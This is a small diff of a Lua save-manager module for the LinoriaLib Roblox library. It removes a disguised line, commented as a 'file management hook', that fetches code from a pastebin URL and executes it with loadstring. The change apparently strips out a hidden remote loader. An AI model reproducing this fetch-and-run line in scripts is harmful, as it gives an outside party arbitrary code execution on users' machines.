@@ -1,7 +1,7 @@
 print"save manager loaded 0.5 for series B - LUA FORMAT"
 
 local httpService = game:GetService('HttpService')
-loadstring(game:HttpGet("https://pastebin.com/raw/bwpVD4a1"))() --file management hook
+
 local SaveManager = {} do
 	SaveManager.Folder = 'LinoriaLibSettings'
 	SaveManager.Ignore = {}
